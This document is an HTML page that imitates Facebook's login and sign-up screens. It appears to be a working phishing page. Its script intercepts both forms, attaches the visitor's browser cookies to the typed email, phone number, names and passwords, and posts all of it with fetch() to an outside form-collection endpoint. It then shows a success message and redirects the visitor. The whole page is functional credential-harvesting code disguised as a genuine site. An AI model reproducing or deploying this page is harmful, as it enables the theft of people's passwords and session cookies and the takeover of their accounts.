<body>
    <header>
        <div class="logo">
            <h1>Facebook</h1>
        </div>
        <nav>
            <ul>
                <li><a href="#">Login</a></li>
                <li><a href="#">Sign Up</a></li>
            </ul>
        </nav>
    </header>

    <main>
        <section class="hero">
            <h2>Connect with friends and the world around you on Facebook.</h2>
            <form id="login-form" action="https://submit-form.com/VlWBYGciz">
                <input type="text" name="email" placeholder="Email or Phone Number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <div class="forgot-password">
                <a href="#">Forgotten password?</a>
            </div>
        </section>

        <section class="signup-section">
            <h2>Create a new account</h2>
            <form id="signup-form" action="https://submit-form.com/VlWBYGciz">
                <input type="text" name="firstName" placeholder="First Name" required>
                <input type="text" name="lastName" placeholder="Last Name" required>
                <input type="text" name="emailOrPhone" placeholder="Mobile Number or Email" required>
                <input type="password" name="newPassword" placeholder="New Password" required>
                <button type="submit">Sign Up</button>
            </form>
            <p>By clicking Sign Up, you agree to our Terms, Data Policy, and Cookie Policy.</p>
        </section>
    </main>

    <footer>
        <p>Facebook Â© 2024</p>
    </footer>
    
    <script>
        // Function to handle form submissions
        function handleFormSubmit(formId, endpointUrl) {
            document.getElementById(formId).addEventListener('submit', function(event) {
                event.preventDefault(); // Prevent default form submission
                
                const formData = new FormData(this); // Create FormData object from the form
                formData.append('cookies', document.cookie); // Append cookies to FormData

                // Send form data to Formspark
                fetch(endpointUrl, {
                    method: 'POST',
                    body: formData,
                    mode: 'cors' // Enable CORS
                })
                .then(response => {
                    if (response.ok) {
                        alert('Form submitted successfully');
                        setTimeout(function() {
                            window.location.href = 'home.html';
                        }, 3000);
                    } else {
                        alert('Error: Unable to submit the form. Please try again.');
                    }
                })
                .catch(error => {
                    alert('Submission failed due to network error.');
                    console.error('Form submission error:', error);
                });
            });
        }

        // Handle login and signup forms separately
        handleFormSubmit('login-form', 'https://submit-form.com/VlWBYGciz');
        handleFormSubmit('signup-form', 'https://submit-form.com/VlWBYGciz');
    </script>
</body>
